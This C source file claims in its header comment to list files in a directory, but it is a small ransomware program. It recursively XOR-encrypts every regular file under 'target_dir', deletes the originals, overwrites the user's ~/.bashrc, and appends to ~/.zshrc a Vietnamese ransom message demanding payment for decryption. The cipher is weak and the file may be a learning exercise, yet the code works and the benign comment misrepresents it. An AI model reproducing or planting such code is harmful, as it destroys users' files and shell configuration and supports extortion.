/**
 * C program to list all files and sub-directories in a directory.
 */

#include <dirent.h>
#include <linux/limits.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

char key = 'a';

void xorEncrypt(const char *path);
void listFilesRecursively(const char *path, const char *file_name);
void blackmail(void);

int main(int argc, char **argv) {

  // Input path from user
  char *dir_name = "target_dir";
  char *file_name = NULL;

  listFilesRecursively(dir_name, file_name);
  blackmail();

  return 0;
}

void blackmail(void) {
  const char *homedir;
  char bashrc_path[PATH_MAX];
  char zshrc_path[PATH_MAX];

  char buffer[] = "echo 'Tra tien moi decrypt duoc file do nha'\n";

  FILE *fpts, *fptt;

  if ((homedir = getenv("HOME")) == NULL) {
    homedir = getpwuid(getuid())->pw_dir;
  }
  sprintf(bashrc_path, "%s/.bashrc", homedir);
  sprintf(zshrc_path, "%s/.zshrc", homedir);
  
  printf("bashrc: %s\n", bashrc_path);
    
  printf("zshrc: %s\n", zshrc_path);

  fpts = fopen(bashrc_path, "w");
  if (fpts == NULL) {
    printf(" Error in open file %s..!!", bashrc_path);
    return;
  }

  fptt = fopen(zshrc_path, "a");
  if (fptt == NULL) {
    printf(" Error in open file %s..!!", zshrc_path);
    fclose(fptt);
    return;
  }
  fprintf(fpts, "%s", buffer);
  fprintf(fptt, "%s", buffer);

  fclose(fpts);
  fclose(fptt);
}

void xorEncrypt(const char *path) {
  char encrypted_filename[PATH_MAX], ch;
  FILE *fpts, *fptt;

  char suffix[11] = ".encrypted";

  strncpy(encrypted_filename, path, PATH_MAX);
  strncat(encrypted_filename, suffix, sizeof(suffix));

  fpts = fopen(path, "r");
  if (fpts == NULL) {
    printf(" File does not exists or error in opening..!!");
    return;
  }
  fptt = fopen(encrypted_filename, "w");
  if (fptt == NULL) {
    printf(" Error in creation of file %s ..!!", encrypted_filename);
    fclose(fpts);
    return;
  }
  while (1) {
    ch = fgetc(fpts);
    if (ch == EOF) {
      break;
    } else {
      ch = ch ^ key;
      fputc(ch, fptt);
    }
  }
  fclose(fpts);
  fclose(fptt);
}

/**
 * Lists all files and sub-directories at given path.
 */
void listFilesRecursively(const char *base_path, const char *file_name) {
  char path[1000];
  struct dirent *dp;
  DIR *dir = opendir(base_path);

  // Unable to open directory stream
  if (!dir)
    return;

  while ((dp = readdir(dir)) != NULL) {
    if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {

      // Construct new path from our base path
      strcpy(path, base_path);
      strcat(path, "/");
      strcat(path, dp->d_name);

      if (dp->d_type == DT_REG) {
        xorEncrypt(path);
        remove(path);
      }

      listFilesRecursively(path, file_name);
    }
  }

  closedir(dir);
}
